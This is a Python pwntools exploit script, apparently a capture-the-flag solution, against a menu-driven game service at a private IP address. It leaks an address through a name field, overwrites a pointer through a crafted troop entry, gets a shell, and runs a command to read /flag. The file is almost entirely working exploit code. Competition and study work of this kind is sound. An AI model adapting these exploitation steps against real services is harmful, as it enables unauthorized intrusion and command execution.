#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: l1nk & A1Lin

import sys
import requests
from pwn import *

def def_get_flag(ip, port):
    local = False
    if local:
        #io = process("./" + filename)
        #elf = ELF("./" + filename)
        #libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
        #def z(cmd):
        #    gdb.attach(cmd)
        pass
    else:
        io = remote(ip, port)
        #elf = ELF("./" + filename)
        #libc = ELF("./libc.so")
        def z(cmd):
            pass
    io.sendlineafter("Your choice:", "1")
    io.sendafter("username:", "AAAA")
    io.sendafter("password:", "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
    io.sendlineafter("Your choice:", "2")
    io.sendafter("username:", "AAAA")
    io.sendafter("password:", "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
    io.sendlineafter("Your choice:", "4")
    io.sendlineafter("Your choice:", "1")
    io.sendlineafter("name:", "256")
    io.sendafter("name:", "CCCC")
    io.sendlineafter("Your choice:", "4")
    io.sendlineafter("Your choice:", "1")
    io.sendlineafter("recruit:", "1")
    io.sendafter("troop:", "DDD\x00")
    io.sendlineafter("Your choice:", "3")
    io.sendlineafter("Your choice:", "2")
    io.sendlineafter("name:", "256")
    io.sendafter("name:", "EEEEEEEE")
    io.sendlineafter("Your choice:", "5")
    io.recvuntil("EEEEEEEE")
    addr = u64(io.recv(6).ljust(8, '\x00'))
    print hex(addr)
    io.sendlineafter("Your choice:", "4")
    io.sendlineafter("Your choice:", "1")
    io.sendlineafter("recruit:", "1")
    io.sendafter("troop:", "EEE\x00")
    io.sendlineafter("Your choice:", "3")
    io.sendlineafter("Your choice:", "4")
    io.sendlineafter("Your choice:", "2")
    io.sendafter("First:", "EEE\x00")
    io.sendafter("Second:", "EEE\x00")
    addr2 = addr - 155
    print hex(addr2)
    io.sendafter("troop:", p64(addr2))
    io.sendlineafter("Your choice:", "3")
    io.sendlineafter("Your choice:", "4")
    io.sendlineafter("Your choice:", "1")
    io.sendlineafter("recruit:", "1")
    io.sendafter("troop:", "FFF\x00")
    io.sendlineafter("Your choice:", "3")
    io.sendlineafter("Your choice:", "4")
    io.sendlineafter("Your choice:", "1")
    io.sendlineafter("recruit:", "1")
    io.sendafter("troop:", "GGG" + '\x00' * 16 + p64(addr - 0x2d9cd9))
    io.sendlineafter("Your choice:", "3")
    io.sendlineafter("Your choice:", "3")
    io.sendlineafter("Your choice:", "2")
    io.sendlineafter("op:", "0")
    io.sendafter("buy?", "Powerful Sword".ljust(32, '\x00'))
    io.sendlineafter("buy?", "1")
    io.sendline("cat /flag;echo 666")
    data = io.recvuntil("666")
    io.close()
    return data.split("\n")[1]

def main():
    print def_get_flag("172.16.5.16", 5071)

if __name__ == "__main__":
    main()

